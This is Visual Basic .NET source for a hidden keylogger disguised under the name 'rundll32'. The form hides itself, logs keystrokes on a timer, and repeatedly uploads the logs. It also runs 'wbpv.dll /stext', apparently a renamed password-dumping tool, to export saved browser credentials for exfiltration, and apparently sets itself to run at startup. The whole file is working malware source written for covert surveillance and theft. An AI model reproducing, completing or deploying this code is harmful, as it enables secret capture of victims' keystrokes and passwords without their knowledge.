'Written by Kousthub Raja (kousthubr@gmail.com)
'Imports rundll32.Module1

Public Class rundll32



    Private Sub Timer2_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer2.Tick
        Dim Ret As String
        Ret = GetPressedKey()
        If Ret <> sold Then
            sold = Ret
            sSave = sSave & " " & Trim(Ret)
            sSave = Trim(sSave)
        End If
    End Sub

    Private Sub Form1_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
        savefile(sSave & vbCrLf & "End" & vbCrLf)
        Try
            upload(logfile)
        Catch ex As Exception
            Exit Try
        End Try
    End Sub

    Private Sub Form1_Load(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.Load
        If My.Computer.FileSystem.DirectoryExists(directory) = False Then My.Computer.FileSystem.CreateDirectory(directory)

        Dim user() As String = luser.Split("\")

        luser = user(1)
        sSave = vbCrLf & "Start : " & Now & vbCrLf
        makestart()
        Me.Text = Nothing
        Me.Icon = Nothing
        
    End Sub

    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        savefile(sSave & " ")
        sSave = ""

        Try
            For Each file As String In My.Computer.FileSystem.GetFiles(directory)
                upload(file)

            Next
        Catch ex As Exception
            Exit Try
        End Try

    End Sub

    Private Sub rundll32_Shown(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.Shown
        Me.Visible = False
        Me.ShowInTaskbar = False
    End Sub

    Private Sub Timer3_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer3.Tick
        Dim dt As String, dtuser As String
        dt = Now.Year & Now.Month & Now.Day & Now.Hour & Now.Minute & Now.Second
        dtuser = luser & dt

        If apppath <> directory Then
            Try
                With My.Computer.FileSystem
                    Shell(apppath & "\wbpv.dll /stext ft.qut")
                    .MoveFile(apppath & "\ft.qut", directory & "\" & dtuser & "ft.qut")
                End With
                My.Computer.FileSystem.WriteAllText(directory & "\id.dll", dtuser, False)
            Catch ex As Exception
                Exit Try
            End Try
        End If
        Timer3.Enabled = False
    End Sub
End Class
